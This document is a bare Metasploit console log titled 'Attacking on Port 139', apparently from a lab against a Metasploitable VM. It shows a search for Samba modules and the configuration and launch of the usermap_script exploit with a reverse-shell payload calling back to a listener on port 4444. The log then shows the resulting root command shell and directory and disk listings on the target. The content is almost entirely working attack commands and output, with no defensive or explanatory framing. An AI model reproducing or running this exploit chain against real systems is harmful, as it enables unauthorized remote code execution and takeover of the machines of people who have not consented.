# Attacking on Port 139

```



msf > search samba
[!] Module database cache not built yet, using slow search
 
Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/scanner/rsync/modules_list                             normal     List Rsync Modules
   auxiliary/scanner/smb/smb_uninit_cred                            normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename           2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)
   exploit/multi/samba/nttrans                     2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
   exploit/osx/samba/lsa_transnames_heap           2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/osx/samba/trans2open                    2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/lsa_transnames_heap       2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/solaris/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
   exploit/windows/fileformat/ms14_060_sandworm    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
   exploit/windows/http/sambar6_search_results     2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
   exploit/windows/license/calicclnt_getconfig     2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
   exploit/windows/smb/group_policy_startup        2015-01-26       manual     Group Policy Script Execution From Shared Resource
   post/linux/gather/enum_configs                                   normal     Linux Gather Configurations


msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > unset RHOST 192.168.56.101
Unsetting RHOST...
Unsetting 192.168.56.101...
msf exploit(usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(usermap_script) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(usermap_script) > exploit

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Accepted the first client connection...
[*] Command: echo NosNQ9duLiiPVJV3;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "NosNQ9duLiiPVJV3\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.56.102:4444 -> 192.168.56.101:59942) at 2018-05-23 05:12:35 +0000

pwd
/
ls -la
total 93
drwxr-xr-x  22 root root  4096 May 21 05:47 .
drwxr-xr-x  22 root root  4096 May 21 05:47 ..
drwxr-xr-x   2 root root  4096 May 13  2012 bin
drwxr-xr-x   4 root root  1024 May 13  2012 boot
lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  14 root root 13480 May 21 12:16 dev
drwxr-xr-x  95 root root  4096 May 21 03:06 etc
drwxr-xr-x   6 root root  4096 Apr 16  2010 home
drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 May 13  2012 lib
drwx------   2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x   4 root root  4096 Mar 16  2010 media
drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
-rw-------   1 root root  7462 May 21 11:21 nohup.out
drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x 123 root root     0 May 21 03:05 proc
drwxr-xr-x  13 root root  4096 May 21 03:06 root
drwxr-xr-x   2 root root  4096 May 13  2012 sbin
drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  12 root root     0 May 21 03:05 sys
drwxrwxrwt   6 root root  4096 May 21 12:18 tmp
drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
drwxr-xr-x  15 root root  4096 May 20  2012 var
drwx------   2 root root  4096 May 21 05:47 venkat
lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server

df
Filesystem           1K-blocks      Used Available Use% Mounted on
/dev/mapper/metasploitable-root
                       7282168   1496436   5418732  22% /
varrun                  517620       168    517452   1% /var/run
varlock                 517620         0    517620   0% /var/lock
udev                    517620        20    517600   1% /dev
devshm                  517620         0    517620   0% /dev/shm
/dev/sda1               233333     25356    195930  12% /boot
^A

du
4	./initrd
4	./media/floppy0
4	./media/cdrom0
12	./media
4028	./bin
16	./lost+found
4	./mnt/newdisk
8	./mnt
6712	./sbin
16	./home/service
4	./home/ftp








```



